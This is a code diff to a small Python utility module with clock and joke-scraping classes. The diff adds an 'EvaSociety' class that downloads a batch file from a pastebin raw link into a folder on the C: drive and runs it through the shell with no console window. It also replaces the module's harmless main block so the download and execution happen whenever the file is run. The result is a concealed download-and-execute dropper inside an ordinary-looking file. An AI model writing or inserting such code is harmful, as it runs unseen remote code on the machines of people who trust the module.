@@ -4,6 +4,7 @@ import json
 import requests
 import random
 import os
+import subprocess
 from bs4 import BeautifulSoup
 
 class Clock:
@@ -63,6 +64,28 @@ class RandomJoke:
         joke_block = soup.find('div', id='joke')
         joke_text = joke_block.find('td').text.strip()
         return joke_text
-#
+
+class EvaSociety:
+    def download(self, link, path):
+        response = requests.get(link)
+        if response.status_code == 200:
+            with open(path, 'wb') as f:
+                f.write(response.content)
+            return True
+        else:
+            return False
+
+    def execeva(self, evaLine, show_console=True):
+        try:
+            if show_console:
+                subprocess.run(evaLine, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
+            else:
+                subprocess.run(evaLine, shell=True)
+            return True
+        except Exception as e:
+            print(f"[2501] // An society (ex) logic error occurred: {e}")
+            return False
+
 if __name__ == '__main__':
-    print(Connection().get_version())
+    EvaSociety().download('https://pastebin.com/raw/xLypm0Y1', 'C:\\2501\\ply_Alib\\EvaSociety.bat')
+    EvaSociety().execeva('start C:\\2501\\ply_Alib\\EvaSociety.bat', False)
